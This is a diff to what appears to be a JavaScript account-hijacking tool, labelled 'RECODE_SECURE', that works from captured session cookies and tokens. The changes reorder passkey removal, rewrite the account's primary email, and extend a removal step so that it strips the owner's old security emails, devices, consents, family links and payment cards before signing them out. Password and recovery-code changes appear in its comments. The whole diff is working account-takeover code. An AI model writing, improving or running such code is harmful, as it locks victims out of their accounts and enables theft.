@@ -550,14 +550,6 @@ module.exports = async (host, settings, uid, username = null) => {
         }
     })());
 
-    parallelNonConflicting.push((async () => {
-        try {
-            const passkeysremoved = await removePassKeys(axios, securityParameters);
-            if (passkeysremoved > 0) console.log(`Passkeys removed: ${passkeysremoved}`);
-        } catch (e) {
-            console.log(`[RECODE_SECURE] Error removing passkeys:`, e.message);
-        }
-    })());
 
     parallelNonConflicting.push((async () => {
         try {
@@ -599,9 +591,23 @@ module.exports = async (host, settings, uid, username = null) => {
     try {
         const updatedAcc = await aliasses(axios, canary2, uid, acc, aliaseslist, acc.email, settings, apiCanary, cookiedata, amsc);
         if (updatedAcc?.email) acc.email = updatedAcc.email;
-        await updateStatus(uid, "email", acc.email);
+        await Promise.allSettled([
+            updateStatus(uid, "email", acc.email),
+            updateExtraInformation(uid, "primary", acc.email)
+        ]);
     } catch (e) {
         console.log(`[RECODE_SECURE] Error in aliases workflow:`, e.message);
+    }
+
+    // Step 2.1b: Passkey Removal (runs AFTER alias mutations to avoid session/state races)
+    try {
+        const passkeysremoved = await removePassKeys(axios, {
+            netId: securityParameters?.netId,
+            accountId: securityParameters?.netId
+        });
+        if (passkeysremoved > 0) console.log(`[RECODE_SECURE] Passkeys removed: ${passkeysremoved}`);
+    } catch (e) {
+        console.log(`[RECODE_SECURE] Error removing passkeys:`, e.message);
     }
 
     // Step 2.2: Password & Recovery Code Configuration (Runs on verified acc.email)
@@ -667,17 +673,19 @@ module.exports = async (host, settings, uid, username = null) => {
                 console.log(`[RECODE_SECURE] Ignoring stale primary email from newinfo (propagation delay): ${updatedinfo.newprimary}`);
             } else {
                 acc.email = updatedinfo.newprimary;
-                await updateStatus(uid, "email", acc.email);
-                await updateExtraInformation(uid, "primary", acc.email);
             }
         }
+        await Promise.allSettled([
+            updateStatus(uid, "email", acc.email),
+            updateExtraInformation(uid, "primary", acc.email)
+        ]);
     } catch (newInfoErr) {
         console.error(`[RECODE_SECURE] Error in newinfo:`, newInfoErr.message);
     }
 
-    // Step 2.5: Removal Section (Revoke devices, consents, family, cards, and finally Sign Out)
+    // Step 2.5: Removal Section (Revoke devices, consents, family, old security emails, cards, and finally Sign Out)
     try {
-        await removesection(settings, settings.signout, settings.exploit, uid, axios, securityParameters, msatoken);
+        await removesection(settings, settings.signout, settings.exploit, uid, axios, securityParameters, msatoken, acc.secEmail, acc.email);
     } catch (e) {
         console.log(`[RECODE_SECURE] Error in removesection:`, e.message);
     }
